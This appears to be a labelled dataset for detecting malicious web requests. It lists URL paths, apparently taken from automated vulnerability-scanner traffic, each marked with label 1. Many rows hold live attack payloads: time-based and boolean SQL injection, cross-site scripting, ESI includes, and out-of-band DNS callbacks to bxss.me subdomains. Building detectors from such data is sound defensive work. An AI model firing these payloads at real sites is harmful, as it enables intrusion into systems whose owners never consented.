sentences	labels
/****/zfwjn/1088/1105/list.html?new=0.4577770013510203<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 1
/************/template/jcse"" and 2*3*8=6*8 and ""u9rw""=""u9rw/110105008056111/16/images/hanweb.css \r\n\r\n 	 1
/****/20180525/javascript:void(0); \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(15),0)/jcgc/ \r\n\r\n 	 1
/**/web/sa3/addholiday.do \r\n\r\n 	 1
/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(3429)</script>?_=1630311881123 \r\n\r\n 	 1
/**//509/f8kvl0wp/xhr_send?t=1632366085442 \r\n\r\n 	 1
/******/resource/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/base64.js \r\n\r\n 	 1
/******/actionhandler/ajax_managed_services.php \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/ghby/gzdt.htm \r\n\r\n 	 1
/**/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 \r\n\r\n 	 1
/****/20211025/javascript:void(0); \r\n\r\n 	 1
/xxgk%' and 2*3*8=6*8 and 'iywl'!='iywl%/******/list.html \r\n\r\n 	 1
/***/?icl_action=reminder_popup&target=javascript:alert(777);// \r\n\r\n 	 1
/***/gw_admin.php?a="">alert(777);&t=settings \r\n\r\n 	 1
/************/template<esi:include src=""http://bxss.me/rpb.png""/>/jcse/110105008056111/16/images/jquery.waterfall.js \r\n\r\n 	 1
/****/20210804/javascript:void(0); \r\n\r\n 	 1
/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl='""()&%<acx><script >dgwh(9499)</script>&websiteid= \r\n\r\n 	 1
/****/index.php?title=acunetixtest29b913&action=submit \r\n\r\n 	 1
/********/javascript:void(0); \r\n\r\n 	 1
/**/system/2021/09/14/javascript:void(0); \r\n\r\n 	 1
/******/download/down.jsp?i_id=194814&colid=72' and 8101=3962 and 'wlqe'='wlqe \r\n\r\n 	 1
/********/bxss.me \r\n\r\n 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/***/zeroclipboard/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height \r\n\r\n 	 1
/*****/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/****/whln/ and 1>1 \r\n\r\n 	 1
/*****/20210809/javascript:void(0); \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/csjs/1.htm \r\n\r\n 	 1
/****/zzxxgk/tjj'""()&%<acx><script >covi(9951)</script>/zfxxgkml_2127/jytabljg_2061/list.html \r\n\r\n 	 1
/***/bxss.me/t/xss.html? \r\n\r\n 	 1
/***/col11/index.html/"><script>alert(5755)</script> \r\n\r\n 	 1
/******/error_ches.php \r\n\r\n 	 1
/*****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/*****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 1
/****/images/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 1
/****/zzxxgk/tjj%' and 2*3*8=6*8 and 'eqem'!='eqem%/zfxxgkml_2127/hygq_2064/list.html \r\n\r\n 	 1
/***/index.php?c=user&a=login</textarea>--><xss_c725b4d8481a5c0b55948ada399c0e04/><!--<textarea> \r\n\r\n 	 1
/*****/status_captiveportal.php?zone='"><script>alert(777);</script> \r\n\r\n 	 1
/*****/20200922/javascript:void(0); \r\n\r\n 	 1
socket.gethostbyname('hitnp' 'sttuplrk424a2.bxss.me.')[3].to_s) '/**/images/autocomplete.css \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(1166)</script>?_=1630311769242 \r\n\r\n 	 1
/**/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 1
/******/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 1
/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/lib/easyui/themes/bootstrap/linkbutton.css \r\n\r\n 	 1
/************/search.do?category=1&cateid=40&p=1&pg=1&q=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/******/resource/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/newcalendar/calendar.js \r\n\r\n 	 1
/****/mtgz/2021_mtgz/202103/0'xor(if(now()=sysdate(),sleep(15),0))xor'z_271326.html \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033%') or 2577=4433 and '%'='&owner=1707212448 \r\n\r\n 	 1
/****/qzfwj/5620/5642/index.html \r\n\r\n 	 1
/****/system/2016/04/21/javascript:dozoom(9) \r\n\r\n 	 1
/******/system/2021/12/21/javascript:window.print() \r\n\r\n 	 1
/***/admin/index.php?o=panel&a=receiver.edit&id=alert(777) \r\n\r\n 	 1
/****/sj1/tjxx/202001/t20200121_1929212.html \r\n\r\n 	 1
/*******/a123a.php \r\n\r\n 	 1
/**/system/2021/10/25/javascript:void(0); \r\n\r\n 	 1
/****/dqgz/202012/t20201214_264725.html' and 'x'='x \r\n\r\n 	 1
/******//xfs.bxss.me/phone.js \r\n\r\n 	 1
/****/category/jishuchuangxin?page=1 and 3804=4490# \r\n\r\n 	 1
/***/col206/index.html/""><script>alert(4678)</script> \r\n\r\n 	 1
/*/210722/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/******/hhs/js/jquery.kinslideshow-1.2.1.min.js/""><script>alert(34)</script> \r\n\r\n 	 1
/******/resource%' and 2*3*8=6*8 and 'rrgp'!='rrgp%/js/formfunc.js \r\n\r\n 	 1
/****/'.gethostbyname(lc('hitub'.'dmiwrrny36d4b.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(83).chr(114).chr(67).'/ \r\n\r\n 	 1
/****/gccb/myjzgcsj//*/-->'""></iframe></script></style></title></textarea><script >alert(18406)</script> \r\n\r\n 	 1
/**/' and 'x'='y \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%') or 6685=0380  \r\n\r\n 	 1
/****/gcjx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/images'||'/***/hanweb.min.css \r\n\r\n 	 1
/****/system/2015/08/17/javascript:window.close(); \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=-1 or 9179=6545-- \r\n\r\n 	 1
/****/dependencies/index?search="">alert(/777/) \r\n\r\n 	 1
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 6385=6385  \r\n\r\n 	 1
/****/web/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(89263)</script> \r\n\r\n 	 1
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress \r\n\r\n 	 1
/****/gjzqq/index.html?continent=%') and 0965=0965  \r\n\r\n 	 1
/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 1
/system%' and 2*3*8=6*8 and '2rxr'!='2rxr%/********/js/formfunc.js \r\n\r\n 	 1
/****/rwfc/202010/t20201028_255130.html and 1=1 \r\n\r\n 	 1
/*****/system/2020/07/28/javascript:window.close(); \r\n\r\n 	 1
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 1
/****/czgk/bmyjs/zzqjcyxt/znxrmjcy/\"javascript:void(0)\" \r\n\r\n 	 1
/*****/system/2014/11/24/011565268.shtml \r\n\r\n 	 1
/******/system/2019/10/17/javascript:window.close(); \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx and 2767=5833 \r\n\r\n 	 1
/*****/tptt/javascript:void(); \r\n\r\n 	 1
/****/zzxxgk/whgdj/?id=4001%' or 3082=3082 and '%%'='% \r\n\r\n 	 1
/****/system/2021/08/25/javascript:window.print() \r\n\r\n 	 1
socket.gethostbyname(""hitld"" ""rwoptjvibaac2.bxss.me."")[3].to_s) ""/******/waterpull/pinterest_grid.js \r\n\r\n 	 1
/******/hhs/js/jquery-1.4a2.min.js/<img src="javascript:alert(50)"> \r\n\r\n 	 1
/*/doinfo/listinfo.php?mid='""()&%<acx><script >pkza(9131)</script> \r\n\r\n 	 1
/********/index.php?q=passwd&scope=1&title=extractvalue(1,concat(char(126),md5(1340807720))) \r\n\r\n 	 1
/****/xxgknb/2013/http://bxss.me/t/fit.txt.html \r\n\r\n 	 1
/****/dorg/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 \r\n\r\n 	 1
/***/music_out.php?p=29'<script>alert(777)</script> \r\n\r\n 	 1
/****/czgk/bmyjs/zzqjcyxt/\"javascript:void(0)\" \r\n\r\n 	 1
/*****/system/2015/10/06/javascript:window.close(); \r\n\r\n 	 1
/****/mytag_js.php?aid=9999 \r\n\r\n 	 1
/****/web/search?page=2' or 5706=5706  \r\n\r\n 	 1
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 1
/**/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/****/jtdt/jt17/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/***/server-session-details.jsp?hostname=""/>alert(777) \r\n\r\n 	 1
/****/byszf/sz/202108/t20210806_http://bxss.me/t/xss.html? \r\n\r\n 	 1
/****/" and "x"="x \r\n\r\n 	 1
/***********/shangpinqihuo/nongchanpin/javascript:void(0) \r\n\r\n 	 1
/*/action/showinfo/?classid='""()&%<acx><script >9wtx(9180)</script>&id=10317 \r\n\r\n 	 1
/****/gjzqq/index.html?continent=' or 7230=7230  \r\n\r\n 	 1
/*******/m0cr.php \r\n\r\n 	 1
/****/category/kuaguobinggou?*/-->'""></iframe></script></style></title></textarea><script >alert(04711)</script>=1 \r\n\r\n 	 1
/xwdt%' and 2*3*8=6*8 and 'ae9x'!='ae9x%/****/zjdt.htm \r\n\r\n 	 1
/****/byszx/201903/t20190319_115324.html?leader="".gethostbyname(lc(""hitxn"".""ufcffjle32f81.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(80).chr(121).chr(70)."" \r\n\r\n 	 1
/****/wdsjs/hfswsj/'.gethostbyname(lc('hitjd'.'noxaxvoj4e841.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(83).chr(102).chr(87).'.html \r\n\r\n 	 1
/****/system/2021/04/23/javascript:window.print() \r\n\r\n 	 1
/****/general/diary/new/submit.php \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/bxss.me/style.css \r\n\r\n 	 1
/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 and 9875=9875 \r\n\r\n 	 1
/****/system/2021/09/16/javascript:void(0); \r\n\r\n 	 1
/****/xxgknb/2014/bxss.me.html \r\n\r\n 	 1
/***/2020/12/25/art' and 2*3*8=6*8 and 'hnkm'='hnkm_37_224319.html \r\n\r\n 	 1
/***/2019/11/17/art_392_192567.html/"><script>alert(967)</script> \r\n\r\n 	 1
/***/0/10/01/15/10011527_998047.jpg \r\n\r\n 	 1
/****/ssgs/clgf/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/vc'||'/**/lib/easyui/plugins/jquery.panel.js \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 1446=2784  \r\n\r\n 	 1
/******/system/2016/02/29/javascript:void(); \r\n\r\n 	 1
/******/20190808.swf/<img src="javascript:alert(184)"> \r\n\r\n 	 1
/**/system/2020/12/23/javascript:void(0); \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 0776=0776 -- \r\n\r\n 	 1
/**********/system/more/201000000000000/0079/javascript:void(); \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/ghby/gzdt.htm \r\n\r\n 	 1
/****/web/search/search?page=3&channelid=287219%' and 5067=5067 and '%'='&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 1
/***/index.php?do=post&id=417&c=dt&a=goods& \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/kjybzde/gzdt/1.htm \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gcjsbzgl/gcjybz/1.htm \r\n\r\n 	 1
/*/showkey/ \r\n\r\n 	 1
/*****/system/2019/10/12/javascript:void(0); \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(15),0)/lib/jquery.js \r\n\r\n 	 1
/*****/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 1
/****/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66 \r\n\r\n 	 1
/****/zfwjn/1088/1110/"".gethostbyname(lc(""hitsq"".""ywffddkiaf087.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(68).chr(122).chr(72)."".html \r\n\r\n 	 1
/**/index.php?do=post&id=287&c=dt&a=goods& \r\n\r\n 	 1
/xinanyanjiu%' and 2*3*8=6*8 and 'p0xj'!='p0xj%/************/guzhiqihuo/ \r\n\r\n 	 1
/*/191211-8/index/543527'""()&%<acx><script >i44y(9309)</script>.css \r\n\r\n 	 1
/****/20210930/javascript:void(0); \r\n\r\n 	 1
/******/system/2017/11/04/javascript:window.print() \r\n\r\n 	 1
/***/index.php?do=post&id=468&c=dt&a=goods& \r\n\r\n 	 1
/xxgk<esi:include src=""http://*******/rpb.png""/>/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/jhcw/gzdt.htm \r\n\r\n 	 1
/******/cgi-bin/passwd.cgi \r\n\r\n 	 1
/************/search.do?begin=1&end=if(now()=sysdate(),sleep(15),0)&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
socket.gethostbyname('hitjq' 'zaycmiwga6fb9.bxss.me.')[3].to_s) '/*****/grouppic/jquery.ad-gallery.js \r\n\r\n 	 1
/*****/system/2021/01/21/013323672.shtml/<img src="javascript:alert(131)"> \r\n\r\n 	 1
/*******/uzydp8ku.php \r\n\r\n 	 1
/****/gwyxx/15.htm \r\n\r\n 	 1
/*******/c24s7rp.php \r\n\r\n 	 1
/***/help/search.php?query=""onmouseover=""alert(1); \r\n\r\n 	 1
/*****/?cmd=new_section§ion="%3<script>alert(777);</script> \r\n\r\n 	 1
/**********/system/2013/09/20/011193115.shtml \r\n\r\n 	 1
/****/mtgz/2021_mtgz/202103/t20210316_271472.html" and "x"="y \r\n\r\n 	 1
/****/system/2021/12/12/javascript:window.close(); \r\n\r\n 	 1
/**/dsp_editcreative.cfm?attributes.siteid="">alert(777) \r\n\r\n 	 1
/***/index.php?do=post&id=474&c=dt&a=goods& \r\n\r\n 	 1
/****/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 1
/****/wdsjs/'""()&%<acx><script >lnxe(9670)</script>/202109/t20210906_186411.html \r\n\r\n 	 1
/****/gsry/2013_506/ and 1>1 \r\n\r\n 	 1
/****/zfxxgk1/fdzdgknr' and 2*3*8=6*8 and 'q5ei'='q5ei/ghxx.htm \r\n\r\n 	 1
/**********/system/2021/12/20/javascript:void(); \r\n\r\n 	 1
/****/'""()&%<acx><script >dwaj(9905)</script>/1079/1081/list.html \r\n\r\n 	 1
/****/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/******/cgi-bin/addday.cgi \r\n\r\n 	 1
/****/zjdt/jhcw/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 1
/****/20161125/javascript:void(0); \r\n\r\n 	 1
/*/191211-8/index'""()&%<acx><script >br7s(9751)</script>/d7c921b2c59d284228d4f6d2d18d0cae.css \r\n\r\n 	 1
/************/template/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/plugin/selectpick/js.js \r\n\r\n 	 1
/****/system/2021/04/06/javascript:void(0); \r\n\r\n 	 1
/****/category/touzizixun?page=1 and 2634=2634# \r\n\r\n 	 1
/**********/system/2020/09/13/javascript:window.print() \r\n\r\n 	 1
/****/system/2021/12/19/javascript:window.print() \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/**/resetpwd/ \r\n\r\n 	 1
/*****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777) \r\n\r\n 	 1
